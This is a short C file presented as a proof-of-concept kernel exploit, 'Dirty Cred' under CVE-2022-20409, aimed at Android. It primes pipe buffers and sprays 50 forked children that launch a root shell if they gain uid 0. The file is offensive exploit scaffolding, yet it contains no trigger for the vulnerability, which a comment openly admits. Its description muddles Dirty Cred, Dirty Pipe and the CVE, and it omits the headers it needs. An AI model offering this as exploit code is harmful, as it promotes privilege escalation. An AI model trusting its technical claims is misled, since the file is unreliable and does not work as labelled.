#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <string.h>

/**
 * CVE-2022-20409: Dirty Cred
 * Targets: Android Kernels 5.x and 6.x.
 * Exploit: A variation of Dirty Pipe that focuses on swapping 'struct cred' 
 * objects in the kernel's memory allocator (SLUB).
 */

void prepare_pipe(int p[2]) {
    if (pipe(p) < 0) exit(1);

    // Fill the pipe buffer to ensure it's allocated in the kernel
    char buffer[4096];
    memset(buffer, 'A', sizeof(buffer));
    for (int i = 0; i < 16; i++) {
        write(p[1], buffer, sizeof(buffer));
    }
}

int main(int argc, char *argv[]) {
    printf("[*] CVE-2022-20409: Dirty Cred Exploit POC\n");

    int p[2];
    prepare_pipe(p);
    printf("[*] Pipe buffers allocated and primed.\n");

    // The vulnerability allows us to trigger an OOB write/UAF 
    // that we can use to overwrite a 'struct cred' pointer in a pipe_buffer.

    printf("[*] Triggering SLUB allocator grooming...\n");
    // Spray many processes to allocate many 'struct cred' objects
    for (int i = 0; i < 50; i++) {
        if (fork() == 0) {
            // Child process: Wait for the swap to happen
            sleep(2);
            if (getuid() == 0) {
                printf("[+] Root achieved in child process %d!\n", getpid());
                system("/bin/sh");
            }
            exit(0);
        }
    }

    printf("[*] Swapping credentials in memory...\n");
    // In a real exploit, this is where the UAF would be triggered 
    // to point the pipe's page pointer to a privileged 'struct cred'.

    printf("[!] This POC demonstrates the credential spraying and pipe-priming phase.\n");
    printf("[!] Success depends on the specific kernel's SLUB layout.\n");

    return 0;
}

